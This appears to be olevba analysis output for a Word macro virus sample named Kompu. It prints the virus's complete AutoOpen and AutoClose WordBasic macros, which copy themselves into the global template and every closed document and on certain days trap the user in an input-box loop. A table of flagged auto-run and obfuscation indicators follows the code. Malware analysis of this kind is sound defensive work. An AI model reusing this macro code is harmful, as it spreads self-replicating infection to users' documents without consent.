olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu-d4f43d7fc50ddd994d3bfb0c23aa4745ac892e0b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu-d4f43d7fc50ddd994d3bfb0c23aa4745ac892e0b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kompu-d4f43d7fc50ddd994d3bfb0c23aa4745ac892e0b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim kuupaev
Dim Kompu$
'aUToOpEn
'Makroviirus Kompu
On Error Resume Next
WordBasic.MacroCopy WordBasic.[MacroFileName$]("aUToOpEn") + ":aUToOpEn", "Global:aUToOpEn"
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
WordBasic.FileSaveAll 1
kuupaev = WordBasic.Day(WordBasic.Now())
If kuupaev = 6 Or kuupaev = 8 Then
While Kompu$ <> "komm"
Kompu$ = WordBasic.[InputBox$]("Tahan kommi!", "Mul on paha tuju!")
Wend
WordBasic.PrintStatusBar "Nämm-Nämm-Nämm-Nämm-Amps-Amps-Klőmps-Kröök!"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Kompu-d4f43d7fc50ddd994d3bfb0c23aa4745ac892e0b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileenimi$
'AutoClose
'Makroviirus Kompu
On Error Resume Next
fileenimi$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:aUToOpEn", fileenimi$ + ":aUToOpEn"
WordBasic.MacroCopy "Global:AutoClose", fileenimi$ + ":AutoClose"
WordBasic.FileSaveAs Name:=fileenimi$, Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

